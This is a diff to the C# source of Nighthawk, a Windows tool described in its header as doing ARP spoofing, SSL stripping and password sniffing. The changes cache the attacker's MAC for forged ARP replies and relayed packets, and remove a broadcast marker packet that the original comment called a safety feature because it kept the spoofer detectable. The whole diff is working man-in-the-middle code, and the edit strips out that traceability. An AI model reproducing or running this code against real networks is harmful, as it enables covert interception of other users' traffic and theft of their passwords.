@@ -9,7 +9,7 @@ using PacketDotNet;
 
 /**
 Nighthawk - ARP spoofing, simple SSL stripping and password sniffing for Windows
-Copyright (C) 2010  Klemen Bratec
+Copyright (C) 2011  Klemen Bratec
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -52,6 +52,7 @@ namespace Nighthawk
         private Thread workerRouter;
 
         private DeviceInfo deviceInfo;
+        private PhysicalAddress physicalAddress;
 
         // constructor
         public ARPTools(DeviceInfo deviceInfo)
@@ -68,6 +69,9 @@ namespace Nighthawk
             SpoofingTargets1 = targets1;
             SpoofingTarget2 = target2;
 
+            // set MAC address
+            physicalAddress = deviceInfo.PMAC;
+             
             // create a new IP - MAC dictionary
             IPtoMACTargets1 = new Dictionary<string, PhysicalAddress>();
             SpoofingTargets1.ForEach(delegate(Target t) { IPtoMACTargets1.Add(t.IP, t.PMAC); });
@@ -160,37 +164,19 @@ namespace Nighthawk
         // create ARP reply packet - source MAC to device MAC
         private EthernetPacket GenerateARPReply(string senderIP, string targetIP, PhysicalAddress targetMAC)
         {
-            return GenerateARPReply(senderIP, targetIP, targetMAC, deviceInfo.PMAC);
+            return GenerateARPReply(senderIP, targetIP, targetMAC, physicalAddress);
         }
 
         // create ARP reply packet
         private EthernetPacket GenerateARPReply(string senderIP, string targetIP, PhysicalAddress targetMAC, PhysicalAddress sourceMAC)
         {
             // generate ethernet part - layer 1
-            var ethernetPacket = new EthernetPacket(deviceInfo.PMAC, targetMAC,
+            var ethernetPacket = new EthernetPacket(physicalAddress, targetMAC,
                                                     EthernetPacketType.Arp);
 
             // arp data - layer 2
             var arpPacket = new ARPPacket(ARPOperation.Response, targetMAC, IPAddress.Parse(targetIP), sourceMAC,
                                        IPAddress.Parse(senderIP));
-
-            ethernetPacket.PayloadPacket = arpPacket;
-
-            return ethernetPacket;
-        }
-
-        // create ARP tracking packet
-        private EthernetPacket GenerateARPTracking()
-        {
-            var targetMAC = PhysicalAddress.Parse("133713371337");
-
-            // generate ethernet part - layer 1
-            var ethernetPacket = new EthernetPacket(deviceInfo.PMAC, targetMAC,
-                                                    EthernetPacketType.Arp);
-
-            // arp data - layer 2
-            var arpPacket = new ARPPacket(ARPOperation.Request, PhysicalAddress.Parse("FFFFFFFFFFFF"), IPAddress.Parse(deviceInfo.Broadcast), deviceInfo.PMAC,
-                                       IPAddress.Parse(deviceInfo.IP));
 
             ethernetPacket.PayloadPacket = arpPacket;
 
@@ -229,10 +215,6 @@ namespace Nighthawk
                 // ...and another
                 sendQueue.Add(GenerateARPReply(SpoofingTarget2.IP, target1.IP, target1.PMAC).Bytes);
             }
-
-            // safety feature (you can be detected even after removal - you're still poisoning with your real MAC address)
-            sendQueue.Add(GenerateARPTracking().Bytes);
-            // safety feature
 
             // loop
             while (SpoofingStarted)
@@ -302,7 +284,7 @@ namespace Nighthawk
                         if (IPtoMACTargets1.ContainsKey(destinationIP) && (destinationMAC != IPtoMACTargets1[destinationIP].ToString()))
                         {
                             // set real MAC
-                            ethernetPacket.SourceHwAddress = deviceInfo.PMAC;
+                            ethernetPacket.SourceHwAddress = physicalAddress;
                             ethernetPacket.DestinationHwAddress = IPtoMACTargets1[destinationIP];
 
                             if (ethernetPacket.Bytes != null) sendQueue.Add(packet.Bytes);
@@ -312,7 +294,7 @@ namespace Nighthawk
                         if (IPtoMACTargets1.ContainsKey(sourceIP) && (destinationMAC != SpoofingTarget2.PMAC.ToString()))
                         {
                             // set real MAC
-                            ethernetPacket.SourceHwAddress = deviceInfo.PMAC;
+                            ethernetPacket.SourceHwAddress = physicalAddress;
                             ethernetPacket.DestinationHwAddress = SpoofingTarget2.PMAC;
 
                             if (ethernetPacket.Bytes != null) sendQueue.Add(packet.Bytes);
@@ -327,7 +309,7 @@ namespace Nighthawk
                 }
                 else
                 {
-                    Thread.Sleep(10);
+                    Thread.Sleep(1);
                 }
             }
 
